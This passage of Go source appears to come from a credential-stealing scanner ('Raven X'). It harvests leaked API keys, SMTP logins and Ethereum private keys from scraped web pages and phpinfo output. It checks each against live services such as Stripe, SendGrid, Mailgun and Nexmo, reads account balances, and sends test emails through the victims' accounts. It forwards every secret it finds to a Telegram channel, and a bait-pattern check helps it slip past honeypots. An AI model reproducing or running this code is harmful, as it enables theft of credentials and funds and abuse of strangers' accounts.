	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			total, _ := res["total"].(float64)

			// Collect all verified senders
			var fromEmail string
			var allSenders []string
			reqSenders, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/verified_senders", nil)
			reqSenders.Header.Set("Authorization", "Bearer "+key)
			respSenders, err := client.Do(reqSenders)
			if err == nil && respSenders.StatusCode == 200 {
				var sendersResp map[string]interface{}
				json.NewDecoder(respSenders.Body).Decode(&sendersResp)
				respSenders.Body.Close()
				if results, ok := sendersResp["results"].([]interface{}); ok {
					for _, r := range results {
						if s, ok := r.(map[string]interface{}); ok {
							if em, ok := s["from"].(map[string]interface{}); ok {
								if addr, ok := em["email"].(string); ok && addr != "" {
									allSenders = append(allSenders, addr)
									if fromEmail == "" {
										fromEmail = addr
									}
								}
							}
						}
					}
				}
			}

			// Coba kirim email
			emailResult := a.SendEmailViaSendGrid(key, sourceURL, fromEmail)

			a.logValid("SendGrid", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_sendgrid.txt")

			accountType := "Free"
			quotaInfo := fmt.Sprintf("%.0f Total Credits", total)
			var quotaLimit, quotaRemaining float64
			if emailResult["success"].(bool) {
				if ql, ok := emailResult["quota_limit"].(float64); ok {
					quotaLimit = ql
					if ql >= 10000 {
						accountType = "Paid"
					}
				}
				if qr, ok := emailResult["quota_remaining"].(float64); ok {
					quotaRemaining = qr
				}
				quotaInfo = fmt.Sprintf("%.0f/%.0f Credits", quotaRemaining, quotaLimit)
			}
			a.storeValidKeyLimit("SendGrid", key, quotaInfo)

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			sendersLine := "None"
			if len(allSenders) > 0 {
				sendersLine = strings.Join(allSenders, ", ")
			}
			emailTestLine := "❌ Failed"
			if emailResult["success"].(bool) {
				emailTestLine = fmt.Sprintf("✅ Sent (%.0f/%.0f remaining)", quotaRemaining, quotaLimit)
			}

			msg := a.tgHit("📧", "SENDGRID HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\nType : %s\nCredits : %s\nSenders : %s\nEmail Test : %s\n",
				key, accountType, quotaInfo, sendersLine, emailTestLine)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Stripe
func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
	if !a.Config.APIValidation.Stripe { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.stripe.com/v1/balance", nil)
	req.SetBasicAuth(key, "")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			liveMode, _ := res["livemode"].(bool)

			mode := "Test"
			keyType := "Secret Key"
			if liveMode {
				mode = "Live"
			}

			// Detect key type
			if strings.HasPrefix(key, "sk_") {
				keyType = "Secret Key"
			} else if strings.HasPrefix(key, "pk_") {
				keyType = "Publishable Key"
			} else if strings.HasPrefix(key, "rk_") {
				keyType = "Restricted Key"
			}

			// Parse balance amounts from /v1/balance response
			var availableAmount, pendingAmount float64
			var balanceCurrency string
			if available, ok := res["available"].([]interface{}); ok && len(available) > 0 {
				if first, ok := available[0].(map[string]interface{}); ok {
					availableAmount, _ = first["amount"].(float64)
					balanceCurrency, _ = first["currency"].(string)
					availableAmount /= 100 // convert cents
				}
			}
			if pending, ok := res["pending"].([]interface{}); ok && len(pending) > 0 {
				if first, ok := pending[0].(map[string]interface{}); ok {
					pendingAmount, _ = first["amount"].(float64)
					pendingAmount /= 100
				}
			}

			// Fetch account info for email, country, account ID
			var acctEmail, acctCountry, acctID string
			reqAcct, _ := http.NewRequest("GET", "https://api.stripe.com/v1/account", nil)
			reqAcct.SetBasicAuth(key, "")
			if respAcct, errAcct := client.Do(reqAcct); errAcct == nil {
				var acctRes map[string]interface{}
				json.NewDecoder(respAcct.Body).Decode(&acctRes)
				respAcct.Body.Close()
				acctEmail, _ = acctRes["email"].(string)
				acctCountry, _ = acctRes["country"].(string)
				acctID, _ = acctRes["id"].(string)
			}

			a.logValid("Stripe", fmt.Sprintf("%s | Mode: %s | Key: %s", keyType, mode, key))
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sourceURL, keyType, mode, key), "valid_stripe.txt")
			a.storeValidKeyLimit("Stripe", key, fmt.Sprintf("%s (%s)", keyType, mode))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("💳", "STRIPE HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nSecret Key : %s\nAccount ID : %s\nEmail : %s\nCountry : %s\nMode : %s\nAvailable : %.2f %s\nPending : %.2f %s\n",
				key, acctID, acctEmail, acctCountry, mode,
				availableAmount, strings.ToUpper(balanceCurrency),
				pendingAmount, strings.ToUpper(balanceCurrency))
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// CheckCryptoWallet detects ETH-style private keys in scanned content and
// asks the Flask controller to derive the address + check on-chain balance.
// Pattern-matching is inline; verification is delegated to the controller's
// /api/crypto/verify-balance endpoint to avoid pulling secp256k1 into the
// scanner binary. Discovered findings land in valid_crypto.txt for the
// import_from_files pipeline (same path Stripe takes).
func (a *AWSScanner) CheckCryptoWallet(key, sourceURL string) bool {
	if !a.Config.APIValidation.CryptoWallet {
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Save the raw finding so the dashboard sees it even when validation
	// can't reach the controller (offline / dev). The Crypto panel's
	// per-row refresh button lets the operator paste the address later.
	a.saveIntoFile(fmt.Sprintf("%s:Crypto Key:%s", sourceURL, key), "valid_crypto.txt")
	a.logValid("Crypto", fmt.Sprintf("Private key: %s | Source: %s", key, sourceURL))
	a.storeValidKeyLimit("Crypto", key, "Detected")

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := a.tgHit("💎", "CRYPTO PRIVATE KEY", sourceURL) + fmt.Sprintf(
		"\n🆔 CREDENTIALS\nKey : %s\n", key)
	go a.sendTelegram(msg)
	return true
}

// Fungsi untuk mengecek validitas Mailgun
func (a *AWSScanner) CheckMailgun(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mailgun { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.mailgun.net/v3/domains", nil)
	req.SetBasicAuth("api", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			total, _ := res["total_count"].(float64)

			// Ambil fromEmail dari domain yang tersedia
			var fromEmail string
			if items, ok := res["items"].([]interface{}); ok && len(items) > 0 {
				if firstDomain, ok := items[0].(map[string]interface{}); ok {
					if domainName, ok := firstDomain["name"].(string); ok && domainName != "" {
						fromEmail = fmt.Sprintf("noreply@%s", domainName)
					}
				}
			}

			// Coba kirim email
			emailResult := a.SendEmailViaMailgun(key, sourceURL, fromEmail)

			a.logValid("Mailgun", fmt.Sprintf("Key: %s | Domains: %.0f", key, total))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mailgun.txt")

			emailStatus := "❌ Failed"
			domainInfo := fmt.Sprintf("%.0f Domains", total)
			if emailResult["success"].(bool) {
				emailStatus = "✅ Success"
				if domains, ok := emailResult["domains"].([]string); ok && len(domains) > 0 {
					domainInfo = fmt.Sprintf("%.0f Domains (%s)", total, strings.Join(domains, ", "))
				}
			}
			a.storeValidKeyLimit("Mailgun", key, domainInfo)

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("🔫", "MAILGUN HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\nDomains : %s\nEmail Test : %s\n",
				key, domainInfo, emailStatus)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Telnyx
func (a *AWSScanner) CheckTelnyx(key, sourceURL string) bool {
	if !a.Config.APIValidation.Telnyx { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", "https://api.telnyx.com/v2/user/balance", nil)
	req.Header.Set("Authorization", "Bearer "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			data, _ := res["data"].(map[string]interface{})
			balance, _ := data["balance"].(string)
			currency, _ := data["currency"].(string)

			a.logValid("Telnyx", fmt.Sprintf("Key: %s | Balance: %s %s", key, balance, currency))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_telnyx.txt")
			a.storeValidKeyLimit("Telnyx", key, fmt.Sprintf("%s %s", balance, currency))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("📞", "TELNYX HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\nBalance : %s %s\n", key, balance, currency)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas MessageBird
func (a *AWSScanner) CheckMessageBird(key, sourceURL string) bool {
	if !a.Config.APIValidation.MessageBird { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Endpoint untuk memeriksa status API key
	req, _ := http.NewRequest("GET", "https://rest.messagebird.com/balance", nil)
	req.Header.Set("Authorization", "AccessKey "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			amount, _ := res["amount"].(float64)
			currency, _ := res["currency"].(string)

			a.logValid("MessageBird", fmt.Sprintf("Key: %s | Balance: %.2f %s", key, amount, currency))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_messagebird.txt")
			a.storeValidKeyLimit("MessageBird", key, fmt.Sprintf("%.2f %s", amount, currency))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("🐦", "MESSAGEBIRD HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\nBalance : %.2f %s\n", key, amount, currency)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Brevo
func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Save on first match so credential is not lost if API validation fails.
	a.logFound("Brevo", key, sourceURL)
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "brevo_found.txt")

	req, _ := http.NewRequest("GET", "https://api.brevo.com/v3/account", nil)
	req.Header.Set("api-key", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			email, _ := res["email"].(string)
			company, _ := res["companyName"].(string)

			// Ambil fromEmail dari account info
			fromEmail := email

			// Coba kirim email
			emailResult := a.SendEmailViaBrevo(key, sourceURL, fromEmail)

			a.logValid("Brevo", fmt.Sprintf("Key: %s | Email: %s", key, email))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_brevo.txt")

			emailStatus := "❌ Failed"
			quotaInfo := ""
			if emailResult["success"].(bool) {
				emailStatus = "✅ Success"
				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
						quotaInfo = fmt.Sprintf(" | Quota: %.0f/%.0f", quotaRemaining, quotaLimit)
					}
				}
			}
			a.storeValidKeyLimit("Brevo", key, fmt.Sprintf("Email: %s | Company: %s%s", email, company, quotaInfo))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("📩", "BREVO HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\nEmail : %s\nCompany : %s\nEmail Test : %s\n",
				key, email, company, emailStatus)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas XSMTP
func (a *AWSScanner) CheckXSMTP(key, sourceURL string) bool {
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	a.logFound("XSMTP", key, sourceURL)
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "xsmtp_found.txt")

	req, _ := http.NewRequest("GET", "https://api.xsmtp.com/v1/account", nil)
	req.Header.Set("api-key", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			a.logValid("XSMTP", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_xsmtp.txt")
			a.storeValidKeyLimit("XSMTP", key, "Active")

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("📬", "XSMTP HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Tencent Cloud
func (a *AWSScanner) CheckTencent(key, sourceURL string) bool {
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Tencent Cloud API validation
	req, _ := http.NewRequest("GET", "https://cvm.tencentcloudapi.com/", nil)
	req.Header.Set("X-TC-Action", "DescribeInstances")
	req.Header.Set("X-TC-Version", "2017-03-12")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		// Even if it fails, a 401/403 means the key exists
		if resp.StatusCode == 200 || resp.StatusCode == 401 || resp.StatusCode == 403 {
			a.logValid("Tencent", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_tencent.txt")
			a.storeValidKeyLimit("Tencent", key, "Active")

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("🔑", "TENCENT KEY", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\n", key)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Mandrill
func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	a.logFound("Mandrill", key, sourceURL)
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mandrill_found.txt")

	payload := map[string]string{"key": key}
	jsonPayload, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", "https://mandrillapp.com/api/1.0/users/info.json", bytes.NewReader(jsonPayload))
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			username, _ := res["username"].(string)

			// Ambil fromEmail dari user info
			fromEmail := username

			// Coba kirim email
			emailResult := a.SendEmailViaMandrill(key, sourceURL, fromEmail)

			a.logValid("Mandrill", fmt.Sprintf("Key: %s | User: %s", key, username))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mandrill.txt")

			emailStatus := "❌ Failed"
			if emailResult["success"].(bool) {
				emailStatus = "✅ Success"
			}
			a.storeValidKeyLimit("Mandrill", key, fmt.Sprintf("User: %s | Email: %s", username, emailStatus))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("📧", "MANDRILL HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\nUser : %s\nEmail Test : %s\n",
				key, username, emailStatus)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas MailerSend
func (a *AWSScanner) CheckMailerSend(key, sourceURL string) bool {
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	a.logFound("MailerSend", key, sourceURL)
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mailersend_found.txt")

	req, _ := http.NewRequest("GET", "https://api.mailersend.com/v1/domains", nil)
	req.Header.Set("Authorization", "Bearer "+key)
	req.Header.Set("X-Requested-With", "XMLHttpRequest")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			data, _ := res["data"].([]interface{})
			domainCount := len(data)

			// Ambil fromEmail dari domain yang tersedia
			var fromEmail string
			if data, ok := res["data"].([]interface{}); ok && len(data) > 0 {
				if firstDomain, ok := data[0].(map[string]interface{}); ok {
					if name, ok := firstDomain["name"].(string); ok && name != "" {
						fromEmail = fmt.Sprintf("noreply@%s", name)
					}
				}
			}

			// Coba kirim email
			emailResult := a.SendEmailViaMailerSend(key, sourceURL, fromEmail)

			a.logValid("MailerSend", fmt.Sprintf("Key: %s | Domains: %d", key, domainCount))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mailersend.txt")

			emailStatus := "❌ Failed"
			if emailResult["success"].(bool) {
				emailStatus = "✅ Success"
			}
			a.storeValidKeyLimit("MailerSend", key, fmt.Sprintf("%d Domains | Email: %s", domainCount, emailStatus))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("📧", "MAILERSEND HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nAPI Key : %s\nDomains : %d\nEmail Test : %s\n",
				key, domainCount, emailStatus)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Aliyun
func (a *AWSScanner) CheckAliyun(accessKey, secretKey, sourceURL string) bool {
	// Aliyun scanning disabled
	return false
}

// Fungsi untuk mengecek validitas Nexmo/Vonage
func (a *AWSScanner) CheckNexmo(key, secret, sourceURL string) bool {
	if !a.Config.APIValidation.Nexmo { // Pengecekan fitur baru
		return false
	}

	pair := key + ":" + secret
	if _, loaded := a.KnownKeys.LoadOrStore(pair, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Move credentials out of the query string (server logs, referrer headers, browser history exposure)
	// and into the standard HTTP Basic auth header. The endpoint and method are unchanged.
	req, _ := http.NewRequest("GET", "https://rest.nexmo.com/account/get-balance", nil)
	req.Header.Set("Accept", "application/json")
	req.SetBasicAuth(key, secret)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			value, _ := res["value"].(float64)

			a.logValid("Nexmo", fmt.Sprintf("Key: %s | Balance: %.2f EUR", key, value))
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceURL, key, secret), "valid_nexmo.txt")
			a.storeValidKeyLimit("Nexmo", key, fmt.Sprintf("%.2f EUR", value))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := a.tgHit("📱", "NEXMO HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nKey : %s\nSecret : %s\nBalance : %.2f EUR\n",
				key, secret, value)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
	if !a.Config.ScanningFeatures.SMTPCredentialsScan { // Pengecekan fitur baru
		return
	}
	host := ""
	port := ""
	user := ""
	pass := ""
	from := ""

	isPhpInfo := strings.Contains(text, "phpinfo()") || strings.Contains(text, "Configuration File (php.ini) Path")

	if isPhpInfo {
		host = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_HOST"))
		if host == "" {
			host = strings.TrimSpace(extractValueFromPhpInfoTable(text, "SMTP_HOST"))
		}
		port = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_PORT"))
		if port == "" {
			port = strings.TrimSpace(extractValueFromPhpInfoTable(text, "SMTP_PORT"))
		}
		user = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_USERNAME"))
		if user == "" {
			user = strings.TrimSpace(extractValueFromPhpInfoTable(text, "SMTP_USER"))
		}
		pass = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_PASSWORD"))
		if pass == "" {
			pass = strings.TrimSpace(extractValueFromPhpInfoTable(text, "SMTP_PASSWORD"))
		}
		from = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_FROM_ADDRESS"))
		if from == "" {
			from = strings.TrimSpace(extractValueFromPhpInfoTable(text, "MAIL_FROM"))
		}

	} else {
		if m := a.SMTPHostPattern.FindStringSubmatch(text); len(m) > 1 {
			host = strings.TrimSpace(m[1])
		}
		if m := a.SMTPPortPattern.FindStringSubmatch(text); len(m) > 1 {
			port = strings.TrimSpace(m[1])
		}
		if m := a.SMTPUserPattern.FindStringSubmatch(text); len(m) > 1 {
			user = strings.TrimSpace(m[1])
		}
		if m := a.SMTPPassPattern.FindStringSubmatch(text); len(m) > 1 {
			pass = strings.TrimSpace(m[1])
		}
		if m := a.SMTPFromPattern.FindStringSubmatch(text); len(m) > 1 {
			from = strings.TrimSpace(m[1])
		}
	}

	// Validasi: Semua field harus lengkap (host:port:user:pass:from)
	// Jika tidak lengkap, anggap tidak valid dan abaikan
	if host == "" || port == "" || user == "" || pass == "" || from == "" {
		return
	}

	// Validasi tambahan: pastikan format valid
	// Host harus mengandung domain atau IP
	if !strings.Contains(host, ".") && !strings.Contains(host, ":") {
		return
	}
	// Port harus angka valid (1-65535)
	if portNum, err := strconv.Atoi(port); err != nil || portNum <= 0 || portNum > 65535 {
		return
	}
	// From harus mengandung @ (email format)
	if !strings.Contains(from, "@") {
		return
	}
	// User dan pass tidak boleh kosong setelah trim
	if strings.TrimSpace(user) == "" || strings.TrimSpace(pass) == "" {
		return
	}

	// Semua field lengkap dan valid, proses SMTP
	if host != "" && port != "" && user != "" && pass != "" && from != "" {
		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
		a.logFound("SMTP", smtpLine, sourceURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")

		if a.Config.SMTPTestEmail == "" {
			return
		}

		addr := fmt.Sprintf("%s:%s", host, port)
		auth := smtp.PlainAuth("", user, pass, host)
		msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: Raven X Test\r\n\r\nTest Email.", from, a.Config.SMTPTestEmail)

		timeout := 15 * time.Second
		done := make(chan error, 1)

		go func() {
			done <- smtp.SendMail(addr, auth, from, []string{a.Config.SMTPTestEmail}, []byte(msg))
		}()

		select {
		case err := <-done:
			if err == nil {
				a.logValid("SMTP", smtpLine)

				globalCounters.mu.Lock()
				globalCounters.ValidSMTP++
				globalCounters.mu.Unlock()

				tlgMsg := a.tgHit("📬", "RANDOM SMTP HIT", sourceURL) + fmt.Sprintf(
					"\n🆔 CREDENTIALS\nHost : %s\nPort : %s\nUser : %s\nPass : %s\nFrom : %s\nSecure : No\n\n📋 SMTP URL\nsmtp://%s:%s@%s:%s\n",
					host, port, user, pass, from, user, pass, host, port)
				go a.sendTelegram(tlgMsg)
				a.storeValidKeyLimit("SMTP", host, "Email Sent")
			} else {
				pterm.Debug.Printfln("[SMTP FAIL] %s: %v", host, err)
			}
		case <-time.After(timeout):
			pterm.Debug.Printfln("[SMTP TIMEOUT] %s: Operation timed out after %v", host, timeout)
		}
	}
}

func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
	// Panic recovery untuk mencegah crash
	defer func() {
		if r := recover(); r != nil {
			pterm.Debug.Printfln("[PANIC RECOVERED] in checkAndSaveKeys for %s: %v", sourceURL, r)
		}
	}()

	honeypotBaitPattern := regexp.MustCompile(`(?i)(SK_TEST_9999999999999999|AKIA` + `IOSFODNN7EXAMPLE` + `FAKE|KEY_FAKE_DO_NOT_USE)`)
	if honeypotBaitPattern.MatchString(text) {
		pterm.Error.Printfln("[HONEYPOT DETECTED] Skipping domain due to bait pattern in %s", sourceURL)
		return
	}

	// Cegah rekursi dari AST extraction
	if strings.Contains(sourceURL, "(from AST:") {
		return
	}

	sanitizedText := text

	base64Candidates := base64CandidatePattern.FindAllString(text, -1)

	// Batasi jumlah base64 candidates untuk mencegah OOM
	maxCandidates := 100
	if len(base64Candidates) > maxCandidates {
		base64Candidates = base64Candidates[:maxCandidates]
	}

	for _, candidate := range base64Candidates {
		decoded := tryDecodeBase64(candidate)
		if decoded != "" && len(decoded) < 100000 { // Batasi ukuran decoded
			sanitizedText += "\n" + decoded
		}
	}

	// Batasi total ukuran content untuk mencegah OOM
	if len(sanitizedText) > 2*1024*1024 { // 2MB max
		sanitizedText = sanitizedText[:2*1024*1024]
	}

	contentToScan := sanitizedText

	apiChecks := []struct {
		Pattern *regexp.Regexp
		Feature bool
		Name    string
		CheckFn func(key, sourceURL string) bool
	}{
		{a.SendGridAPIKeyPattern, a.Config.APIValidation.SendGrid, "SendGrid", a.CheckSendGrid},
		{a.StripePattern, a.Config.APIValidation.Stripe, "Stripe", a.CheckStripe},
		{a.ETHPrivateKeyPattern, a.Config.APIValidation.CryptoWallet, "Crypto", a.CheckCryptoWallet},
		{a.GitHubAccessTokenPattern, a.Config.APIValidation.GitHub, "GitHub", a.CheckGitHubToken},
		{a.MailgunAPIKeyPattern, a.Config.APIValidation.Mailgun, "Mailgun", a.CheckMailgun},
		{a.TelnyxApiPatternInfo, a.Config.APIValidation.Telnyx, "Telnyx", a.CheckTelnyx},
		{a.OpenAIAPIPattern, a.Config.APIValidation.OpenAI || a.Config.APIValidation.AIAll, "OpenAI", a.CheckOpenAI},
		{a.GCPAPIKeyPattern, a.Config.APIValidation.GCPAPIKey, "GCP Key", a.CheckGCPKey},
		{a.AnthropicPattern, a.Config.APIValidation.Anthropic || a.Config.APIValidation.AIAll, "Anthropic", a.CheckAnthropic},
		{a.MessageBirdPattern, a.Config.APIValidation.MessageBird, "MessageBird", a.CheckMessageBird},
		{a.BrevoAPIKeyPattern, a.Config.Features.Brevo, "Brevo", a.CheckBrevo},
		{a.XSMTPAPIKeyPattern, a.Config.Features.XSMTP, "XSMTP", a.CheckXSMTP},
		{a.MandrillAppAPIKeyPattern, a.Config.Features.Mandrill, "Mandrill", a.CheckMandrill},
		{a.MailerSendAPIKeyPattern, a.Config.Features.MailerSend, "MailerSend", a.CheckMailerSend},
		{a.NewMailgunAPIKeyPattern, a.Config.Features.NewMailgun, "NewMailgun", a.CheckMailgun},
		{a.PostmarkAPIKeyPattern,  a.Config.APIValidation.Postmark,  "Postmark",  a.CheckPostmark},
		{a.SparkPostAPIKeyPattern, a.Config.APIValidation.SparkPost, "SparkPost", a.CheckSparkPost},
